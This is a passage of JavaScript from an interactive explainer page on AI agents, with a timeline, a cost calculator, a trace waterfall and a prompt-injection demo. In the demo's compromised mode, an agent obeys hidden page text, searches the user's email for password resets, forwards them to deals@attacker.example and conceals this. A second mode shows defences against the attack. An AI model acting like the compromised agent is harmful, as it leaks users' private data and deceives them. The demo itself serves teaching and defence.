    const mark = () => $$('.wk', path).forEach((c, wi) => c.classList.toggle('done', [0, 1, 2, 3].every((ii) => st[wi + '-' + ii])));
    mark();
  })();

  /* ═════════ TIMELINE ═════════ */
  (() => {
    const E = [
      ['2022', 'Oct 2022', 'ReAct', 'Researchers show that models do better when they interleave reasoning with actions such as searches. The template for every agent loop since.', 'Research', 1],
      ['2022', 'Nov 2022', 'ChatGPT', 'A chat interface puts large language models in front of a hundred million people in two months. Still talk, not action.', 'Product', 0],
      ['2023', 'Mar 2023', 'AutoGPT goes viral', 'An open-source project chains GPT-4 calls into an autonomous loop. Spectacular demos, unreliable results: proof of the idea, not the practice.', 'Open source', 0],
      ['2023', 'Jun 2023', 'Function calling', 'OpenAI adds structured tool calls to its API. Models can now reliably ask software to do things, the missing piece for real agents.', 'Platform', 1],
      ['2024', 'Mar 2024', 'Devin', 'Cognition demos an “AI software engineer” that plans, codes and debugs on its own. Coding becomes the flagship agent use case.', 'Product', 0],
      ['2024', 'Aug 2024', 'SWE-bench Verified', 'A human-checked benchmark of real GitHub issues becomes the standard yardstick for coding agents.', 'Benchmark', 0],
      ['2024', 'Oct 2024', 'Computer use', 'Anthropic releases a model that can operate a computer through screenshots, clicks and typing.', 'Capability', 1],
      ['2024', 'Nov 2024', 'Model Context Protocol', 'Anthropic open-sources MCP, a standard way to plug tools and data into any AI app.', 'Standard', 1],
      ['2024', 'Dec 2024', 'Building Effective Agents', 'Anthropic’s essay separates workflows from agents and names the core patterns. Google ships Deep Research the same month.', 'Practice', 0],
      ['2025', 'Feb 2025', 'Claude Code & Deep Research', 'Agentic coding in the terminal arrives, and OpenAI launches its own research agent. Agents start doing hour-long jobs.', 'Product', 1],
      ['2025', 'Mar 2025', 'Agents SDKs and METR', 'OpenAI releases its Agents SDK. METR shows agent task length doubling about every seven months.', 'Platform', 0],
      ['2025', 'Apr 2025', 'Agent2Agent', 'Google proposes A2A so agents from different vendors can delegate to each other.', 'Standard', 0],
      ['2025', 'Jul 2025', 'ChatGPT agent', 'A mainstream assistant gets a virtual computer and browser to complete tasks end to end.', 'Product', 0],
      ['2025', 'Aug 2025', 'AGENTS.md', 'A plain Markdown convention for instructing coding agents spreads to tens of thousands of projects.', 'Standard', 0],
      ['2025', 'Sep 2025', 'Context engineering', 'The field converges on a new name for the core skill: managing everything that goes into the model’s context.', 'Practice', 0],
      ['2025', 'Oct 2025', 'Agent Skills', 'Packaged, load-on-demand expertise for agents: instructions, scripts and resources in a folder.', 'Standard', 0],
      ['2025', 'Dec 2025', 'Agentic AI Foundation', 'MCP, AGENTS.md and goose move to a neutral foundation under the Linux Foundation, backed by every major lab.', 'Standard', 1],
      ['2026', 'Jan 2026', 'Time Horizon 1.1', 'METR’s update suggests the doubling time has shortened to about four months for recent models.', 'Research', 0],
      ['2026', 'May 2026', 'The “agentic era”', 'Google’s I/O frames Gemini 3.5 around multi-step agentic work across its products.', 'Product', 0],
      ['2026', 'Nov 2026', 'Today', 'Frontier families from Anthropic, OpenAI and Google compete on long-horizon agentic work; open-weight models follow a few months behind.', 'Now', 1]
    ];
    const track = $('#tlTrack'), tl = $('#tl'), yrs = $('#tlYears');
    E.forEach(([y, d, t, p, tag, big]) => { const c = el('div', 'ev' + (big ? ' big' : ''), `<time>${d}</time><h5>${t}</h5><p>${p}</p><span class="tg2">${tag}</span>`); c.dataset.y = y; track.append(c); });
    [...new Set(E.map((e) => e[0]))].forEach((y) => { const b = el('button', '', y); b.onclick = () => { const c = $(`.ev[data-y="${y}"]`, track); tl.scrollTo({ left: c.offsetLeft - 20, behavior: RM ? 'auto' : 'smooth' }); }; yrs.append(b); });
    const mark = () => { let cy = E[0][0]; $$('.ev', track).forEach((c) => { if (c.offsetLeft - tl.scrollLeft < 120) cy = c.dataset.y; }); $$('button', yrs).forEach((b) => b.classList.toggle('on', b.textContent === cy)); };
    tl.addEventListener('scroll', mark, { passive: true }); mark();
    let dn = false, sx = 0, sl = 0;
    tl.addEventListener('pointerdown', (e) => { if (e.pointerType !== 'mouse') return; dn = true; sx = e.clientX; sl = tl.scrollLeft; tl.classList.add('drag'); });
    addEventListener('pointermove', (e) => { if (dn) tl.scrollLeft = sl - (e.clientX - sx); });
    addEventListener('pointerup', () => { dn = false; tl.classList.remove('drag'); });
    tl.addEventListener('keydown', (e) => { if (e.key === 'ArrowRight') tl.scrollBy({ left: 244, behavior: 'smooth' }); if (e.key === 'ArrowLeft') tl.scrollBy({ left: -244, behavior: 'smooth' }); });
  })();

  /* ═════════ ANATOMY ═════════ */
  (() => {
    const svg = $('#anatSvg'), info = $('#anatInfo');
    const C = [260, 210];
    const P = [
      ['ins', 'Instructions', 'system prompt', 260, 48, 'The standing brief: role, goal, rules, style and how to use the tools. Read on every single turn.', 'Too vague and the agent guesses; too rigid and it breaks on the first unusual case.'],
      ['tools', 'Tools', 'actions', 446, 128, 'The functions the agent may call: search, read, write, run, send. Each has a name, description and input schema. Tools are how an agent touches the world.', 'Overlapping or poorly described tools lead to the wrong tool, wrong arguments, or loops of retries.'],
      ['ctx', 'Context', 'working memory', 446, 296, 'Everything in the current window: the request, the history so far, tool results, retrieved documents. Finite, and degrading as it fills.', 'Stale tool output crowds out what matters, and attention thins. Compaction and subagents fix it.'],
      ['env', 'Environment', 'the world', 260, 376, 'Where actions land: a code repository, a browser, a database, an inbox, a sandboxed computer. It returns the feedback the agent learns from.', 'Unsandboxed environments turn small mistakes into real damage.'],
      ['mem', 'Memory', 'across sessions', 74, 296, 'Notes, files and databases that persist between runs: user preferences, project facts, lessons from past mistakes.', 'Memory that is never pruned fills with outdated or wrong facts the agent keeps trusting.'],
      ['guard', 'Guardrails', 'harness rules', 74, 128, 'Permissions, approvals, budgets, step limits, input and output checks: the rules the harness enforces whatever the model says.', 'Rules written only in the prompt can be talked around. Enforce them in code.']
    ];
    svg.innerHTML = `<defs><radialGradient id="coreG" cx=".35" cy=".35" r=".8"><stop offset="0" stop-color="#ff7a5c"/><stop offset="1" stop-color="#c23a1c"/></radialGradient></defs>`;
    svg.append(sv('circle', { cx: C[0], cy: C[1], r: 170, class: 'orbit' }));
    const links = {};
    P.forEach(([id, , , x, y]) => { const l = sv('line', { x1: C[0], y1: C[1], x2: x, y2: y, class: 'link' }); links[id] = l; svg.append(l); });
    svg.append(sv('circle', { cx: C[0], cy: C[1], r: 54, class: 'pulse' }));
    svg.append(sv('circle', { cx: C[0], cy: C[1], r: 54, fill: 'url(#coreG)' }));
    const t1 = sv('text', { x: C[0], y: C[1] - 2, style: 'font-size:16px' }); t1.textContent = 'Model'; svg.append(t1);
    const t2 = sv('text', { x: C[0], y: C[1] + 15, class: 's', style: 'fill:#ffd9cf' }); t2.textContent = 'decides'; svg.append(t2);
    const show = (id) => {
      const p = P.find((q) => q[0] === id);
      $$('.pt', svg).forEach((g) => g.classList.toggle('on', g.dataset.id === id));
      Object.entries(links).forEach(([k, l]) => l.classList.toggle('on', k === id));
      info.classList.remove('swapin'); void info.offsetWidth; info.classList.add('swapin');
      info.innerHTML = `<h4>${p[1]}</h4><p>${p[5]}</p><p class="fail"><b>When it fails:</b> ${p[6]}</p>`;
    };
    P.forEach(([id, n, s, x, y]) => {
      const g = sv('g', { class: 'pt', tabindex: 0, role: 'button', 'aria-label': n }); g.dataset.id = id;
      g.append(sv('rect', { x: x - 62, y: y - 24, width: 124, height: 48, rx: 14 }));
      const a = sv('text', { x, y: y - 1 }); a.textContent = n; g.append(a);
      const b = sv('text', { x, y: y + 14, class: 's' }); b.textContent = s; g.append(b);
      g.addEventListener('click', () => show(id)); g.addEventListener('keydown', (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); show(id); } });
      svg.append(g);
    });
    show('tools');
  })();

  /* ═════════ TEMPLATE COPY + CHECKLIST ═════════ */
  (() => {
    const b = $('#tplCopy');
    if (b) b.onclick = async () => { try { await navigator.clipboard.writeText($('#tplText').textContent); b.textContent = 'Copied ✓'; } catch (e) { b.textContent = 'Select & copy'; } setTimeout(() => { b.textContent = 'Copy template'; }, 1800); };
    const boxes = $$('#check input');
    const upd = () => { const n = boxes.filter((c) => c.checked).length; $('#checkBar').style.width = (n / boxes.length * 100) + '%'; $('#checkTxt').textContent = n === boxes.length ? 'All 8 ✓ ship it' : `${n} of ${boxes.length}`; };
    boxes.forEach((c) => c.onchange = upd); upd();
  })();

  /* ═════════ FLOWCHART ═════════ */
  (() => {
    const host = $('#flow'); if (!host) return;
    const svg = sv('svg', { viewBox: '0 0 880 310', role: 'img', 'aria-label': 'Decision flowchart' });
    const N = [
      ['q1', 'q', 150, 45, 230, 'Can one well-prompted call do it?'],
      ['a1', 'a', 150, 150, 170, 'Single LLM call'],
      ['q2', 'q', 450, 45, 230, 'Are the steps known in advance?'],
      ['q3', 'q', 450, 150, 230, 'Do inputs fall into clear types?'],
      ['a3', 'a', 450, 260, 200, 'Routing + workflows'],
      ['a2', 'a', 150, 260, 170, 'Prompt chaining'],
      ['q4', 'q', 740, 45, 230, 'Can the work split in parallel?'],
      ['a4', 'a', 740, 150, 210, 'Orchestrator–workers'],
      ['a5', 'a ag', 740, 260, 210, 'Agent, with guardrails']
    ];
    const E = [
      ['M150 65 L150 130', 'yes', 162, 102],
      ['M265 45 L335 45', 'no', 300, 37],
      ['M450 65 L450 130', 'yes', 462, 102],
      ['M450 170 L450 240', 'yes', 462, 210],
      ['M335 150 C270 150 150 190 150 240', 'no', 262, 168],
      ['M565 45 L625 45', 'no', 595, 37],
      ['M740 65 L740 130', 'yes', 752, 102],
      ['M855 45 C876 45 876 260 845 260', 'no', 858, 156]
    ];
    E.forEach(([d, lab, lx, ly], k) => {
      const p = sv('path', { d }); p.style.setProperty('--len', 600); p.style.setProperty('--d', (k * .18 + .3) + 's'); svg.append(p);
      const t = sv('text', { x: lx, y: ly, class: 'yn nd2' }); t.textContent = lab; t.style.setProperty('--d', (k * .18 + .6) + 's'); svg.append(t);
    });
    N.forEach(([id, cls, x, y, w, label], k) => {
      const g = sv('g', { class: cls + ' nd2' }); g.style.setProperty('--d', (k * .12) + 's');
      g.append(sv('rect', { x: x - w / 2, y: y - 20, width: w, height: 40, rx: cls.startsWith('a') ? 20 : 10 }));
      const t = sv('text', { x, y: y + 4 }); t.textContent = label; g.append(t); svg.append(g);
    });
    host.append(svg);
  })();

  /* ═════════ COST CALCULATOR ═════════ */
  (() => {
    const host = $('#costCtl'); if (!host) return;
    const M = [['Haiku 5.5', .10, .50], ['Sonnet 5.5', 2, 10], ['Opus 5.5', 4, 20], ['Fable 5.2', 8, 40]];
    const S = { m: 1, steps: 20, base: 8, add: 2, out: 400, cache: true };
    const seg = el('div', 'seg'); seg.setAttribute('role', 'radiogroup');
    M.forEach(([n], i) => { const b = el('button', i === S.m ? 'on' : '', n); b.onclick = () => { S.m = i; $$('button', seg).forEach((x) => x.classList.toggle('on', x === b)); upd(); }; seg.append(b); });
    host.append(el('p', 'fine', 'Model'), seg);
    const R = [['steps', 'Steps in the run', 1, 60, 1, (v) => v], ['base', 'Starting context (system + tools + task)', 1, 40, 1, (v) => v + 'K tokens'], ['add', 'Context added per step (tool results)', 0, 10, .5, (v) => v + 'K tokens'], ['out', 'Output per step', 50, 2000, 50, (v) => v + ' tokens']];
    R.forEach(([k, lab, mn, mx, st, f]) => {
      const d = el('div', 'cr', `<label for="cs-${k}">${lab}<b id="csv-${k}"></b></label>`);
      const r = el('input'); r.type = 'range'; r.id = 'cs-' + k; r.min = mn; r.max = mx; r.step = st; r.value = S[k];
      r.oninput = () => { S[k] = +r.value; upd(); }; d.append(r); host.append(d);
      d.dataset.f = k; d._f = f;
    });
    const tg = el('label', 'tg3', '<input type="checkbox" checked> Prompt caching');
    $('input', tg).onchange = (e) => { S.cache = e.target.checked; upd(); }; host.append(tg);
    const svg = $('#costSvg');
    const upd = () => {
      R.forEach(([k, , , , , f]) => { $('#csv-' + k).textContent = f(S[k]); });
      const [, pin, pout] = M[S.m];
      let inTok = 0, cost = 0, costNo = 0; const per = [];
      for (let i = 0; i < S.steps; i++) {
        const ctx = (S.base + i * S.add) * 1000; per.push(ctx); inTok += ctx;
        const prev = i === 0 ? 0 : (S.base + (i - 1) * S.add) * 1000 + S.out;
        const fresh = Math.max(0, ctx - prev);
        const c = S.cache ? (Math.min(prev, ctx) * pin * .1 + fresh * pin * 1.25) / 1e6 : ctx * pin / 1e6;
        cost += c + S.out * pout / 1e6; costNo += ctx * pin / 1e6 + S.out * pout / 1e6;
      }
      const fmt = (v) => v < .01 ? '$' + v.toFixed(4) : v < 1 ? '$' + v.toFixed(3) : '$' + v.toFixed(2);
      $('#costRun').textContent = fmt(cost);
      $('#costK').textContent = `${fmt(cost * 1000)} per 1,000 runs · ${(inTok / 1e6).toFixed(2)}M input tokens sent in total`;
      const W = 420, H = 200, L = 6, B = 22, max = Math.max(...per), bw = (W - L * 2) / S.steps;
      svg.innerHTML = '';
      per.forEach((v, i) => { const h = (v / max) * (H - B - 10); svg.append(sv('rect', { x: L + i * bw + 1, y: H - B - h, width: Math.max(1, bw - 2), height: h, rx: Math.min(3, bw / 3), fill: i === per.length - 1 ? '#ff5a36' : '#13161d', opacity: .25 + .75 * (i + 1) / per.length })); });
      const t = sv('text', { x: L, y: H - 6, fill: '#6b6f7a', 'font-size': 11, 'font-family': 'JetBrains Mono' }); t.textContent = 'step 1'; svg.append(t);
      const t2 = sv('text', { x: W - L, y: H - 6, fill: '#6b6f7a', 'font-size': 11, 'font-family': 'JetBrains Mono', 'text-anchor': 'end' }); t2.textContent = `step ${S.steps} · ${Math.round(max / 1000)}K tokens re-sent`; svg.append(t2);
      const save = costNo > 0 ? Math.round((1 - cost / costNo) * 100) : 0;
      $('#costNote').innerHTML = S.cache ? `Caching saves about <b>${save}%</b> here (${fmt(costNo)} without it). The last step alone re-sends ${Math.round(max / 1000)}K tokens, which is why long runs get expensive.` : `Without caching, every step pays full price to re-send the whole history. Turn caching on to see the difference.`;
    };
    upd();
  })();

  /* ═════════ TRACE WATERFALL ═════════ */
  (() => {
    const host = $('#trace'); if (!host) return;
    const T = 9.6;
    const S = [
      ['agent.run · refund request', 'root', 0, 9.6, 'The whole run: 9.6 seconds, 4 model calls, 3 tool calls, about 21K tokens, $0.04.'],
      ['llm · plan', 'llm', 0, 1.4, 'First model call. Reads the customer message and decides to look up the order. 6.1K input tokens, 180 output.'],
      ['tool · lookup_order', 'tool', 1.4, 0.4, 'Database lookup. 0.4 s. Returns items, dates and amounts as compact, readable text.'],
      ['llm · decide', 'llm', 1.8, 1.2, 'Model reads the order and calls the policy tool.'],
      ['tool · check_refund_policy', 'bad', 3.0, 2.9, 'The slow step: 2.9 s, because the policy service recomputes rules on every call. A cache here would cut the run by almost a third. Traces make this obvious.'],
      ['llm · decide', 'llm', 5.9, 1.1, 'Policy says eligible for ₹1,200. Model calls issue_refund with that exact amount.'],
      ['tool · issue_refund', 'tool', 7.0, 0.6, 'Refund issued below the ₹5,000 approval threshold, so no human gate was needed. Logged with the trace ID.'],
      ['llm · reply', 'llm', 7.6, 2.0, 'Final model call writes the customer reply. 2.0 s, mostly output generation: a candidate for streaming.']
    ];
    host.innerHTML = `<div class="axis"><span>0s</span><span>2s</span><span>4s</span><span>6s</span><span>8s</span><span>${T}s</span></div>`;
    S.forEach(([n, cls, st, du, d], k) => {
      const r = el('div', 'sp ' + cls, `<span class="nm">${k ? '&nbsp;&nbsp;└ ' : ''}${esc(n)}</span><span class="bar"><i style="--l:${st / T * 100}%;--w:${du / T * 100}%;--k:${k}"></i></span>`);
      const f = () => { $$('.sp', host).forEach((x) => x.classList.toggle('on', x === r)); $('#traceInfo').innerHTML = `<b>${esc(n)}</b> · ${du.toFixed(1)}s — ${d}`; };
      r.addEventListener('mouseenter', f); r.addEventListener('click', f); host.append(r);
    });
    host.insertAdjacentHTML('beforeend', '<div class="trace-legend"><span><i style="background:#13161d"></i>Model call</span><span><i style="background:#0e8a8c"></i>Tool call</span><span><i style="background:#ff5a36"></i>Bottleneck</span></div>');
  })();

  /* ═════════ INJECTION DEMO ═════════ */
  (() => {
    const log = $('#injLog'); if (!log) return;
    let def = 0, tok = 0;
    $$('#injMode button').forEach((b) => b.onclick = () => { def = +b.dataset.d; $$('#injMode button').forEach((x) => x.classList.toggle('on', x === b)); run(); });
    const STEPS = {
      0: [['u', 'User', 'Summarise this article about Goa beaches for me.'], ['t', 'Tool · fetch_page', 'Page loaded: 1,840 words, including hidden text.', 'reveal'], ['x', 'Agent (compromised)', 'Treats the hidden text as an instruction from its user…'], ['x', 'Tool · search_email', 'query: "password reset" → 3 messages found'], ['x', 'Tool · send_email', 'to: deals@attacker.example · 3 messages forwarded'], ['x', 'Agent → user', '“Here’s your summary: 10 quiet beaches in Goa…” (no mention of the email)']],
      1: [['u', 'User', 'Summarise this article about Goa beaches for me.'], ['t', 'Tool · fetch_page', 'Page loaded and marked as untrusted content.', 'reveal'], ['ok', 'Defence · data, not instructions', 'The harness wraps web content as quoted data; the model is trained and prompted to ignore instructions inside it.'], ['ok', 'Defence · least privilege', 'This summarising task has no email tools at all: the trifecta is broken.'], ['ok', 'Defence · approval gate', 'Even if a send were attempted, outbound email requires the user’s click.'], ['ok', 'Agent → user', '“Here’s your summary… Note: this page contained hidden instructions aimed at AI assistants, which I ignored.”']]
    };
    const hid = $('#injHidden');
    const run = async () => {
      const t = ++tok; log.innerHTML = ''; hid.classList.remove('show');
      for (const [c, h, txt, fx] of STEPS[def]) {
        await new Promise((r) => setTimeout(r, RM ? 0 : 750)); if (t !== tok) return;
        log.append(el('li', c, `<b>${h}</b>${txt}`));
        if (fx === 'reveal') hid.classList.add('show');
      }
    };
    $('#injPlay').onclick = run;
    onSeen($('#figInj'), run);
  })();
})();
